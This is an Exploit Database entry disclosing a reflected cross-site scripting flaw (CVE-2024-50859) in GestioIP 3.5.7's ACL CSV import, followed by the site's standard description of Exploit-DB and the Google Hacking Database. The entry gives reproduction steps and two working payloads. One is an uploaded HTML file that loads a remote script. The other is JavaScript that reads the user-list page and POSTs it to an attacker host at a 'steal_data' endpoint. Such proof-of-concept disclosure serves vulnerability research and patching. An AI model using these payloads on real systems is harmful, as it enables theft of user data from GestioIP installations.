# GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-50859
# Date: 2025-01-13
# Vendor Homepage: https://www.gestioip.net/
# Software Link: https://www.gestioip.net/en/download/
# Version: GestioIP v3.5.7
# Tested on: Kali Linux
# CVE: CVE-2024-50859

### Description

The ip_import_acl_csv request is vulnerable to Reflected XSS (Reflected Cross-Site Scripting); the user can upload a file and the file content is reflected in the HTML response without being sanitized. If the file uploaded by the user has an incorrect format and an error occurs during its processing, part of the file's content may be displayed in the browser. If this content includes HTML or scripts and it is not properly escaped, the browser could interpret it, leading to a security vulnerability. This could allow data exfiltration and enabling CSRF (Cross-Site Request Forgery) attacks.
Proper input validation and output encoding are critical to prevent this vulnerability.

### Prerequisites

Enable (set to 'yes') the parameter:

Manage > Manage GestioIP > ACL connection management

### Usage

Select: import/export > Import ACLs/ACL Connections

Select: "Connection List"

Select "report only"

Browse to select the file you want to upload.

Click 'upload'

### Payloads

#### 1) html file to upload

<html><script src="http://10.20.0.1:8090/refxss_exfiltrate_3.js"></script></html>

#### 2) js file to exfiltrate data

var req1 = new XMLHttpRequest();
req1.open('GET',"http://localhost/gestioip/res/ip_show_user.cgi", false);
req1.send();

response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('POST', "http://10.20.0.1:8000/steal_data", false);
req2.setRequestHeader('Content-Type', 'text/html');
req2.send(response);
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
